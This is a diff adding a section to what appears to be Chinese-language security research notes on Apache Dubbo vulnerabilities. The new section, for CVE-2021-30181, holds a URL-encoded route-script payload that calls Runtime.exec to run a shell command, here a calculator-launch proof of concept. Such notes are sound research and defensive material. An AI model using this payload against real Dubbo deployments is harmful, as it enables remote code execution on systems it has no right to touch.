@@ -164,6 +164,14 @@ Apache Dubbo默认支持泛化引用由服务端API接口暴露的所有方法�
 
 **个人认为CVE-2021-30179的主要思路就是Apache Dubbo在处理泛类引用时，提供了多种通过反序列化方式得到对象再生成pojo对象的选择。** 三梦师傅说跟这个思路扩大了反序列化挖掘思路
 
+### CVE-2021-30181
+
+https://articles.zsxq.com/id_28iczv3uhbtk.html
+
+```exp
+script%3A%2F%2F127.0.0.1%2Fcom.threedr3am.learn.server.boot.DemoService%3Fapplication%3Ddubbo-consumer%26category%3Drouters%26check%3Dfalse%26dubbo%3D2.0.2%26init%3Dfalse%26interface%3Dcom.threedr3am.learn.server.boot.DemoService%26metadata-type%3Dremote%26methods%3Dhello%26pid%3D53953%26qos.enable%3Dfalse%26release%3D2.7.7%26revision%3D1.0%26side%3Dconsumer%26sticky%3Dfalse%26timestamp%3D1622381389749%26version%3D1.0%26route%3Dscript%26type%3Djavascript%26rule%3Ds%253D%255B3%255D%253Bs%255B0%255D%253D'%252Fbin%252Fbash'%253Bs%255B1%255D%253D'-c'%253Bs%255B2%255D%253D'open%2520-a%2520calculator'%253Bjava.lang.Runtime.getRuntime().exec(s)%253B
+```
+
 ### Dubbo反序列化RCE利用之新拓展面 - Dubbo Rouge攻击客户端
 
 https://xz.aliyun.com/t/7354
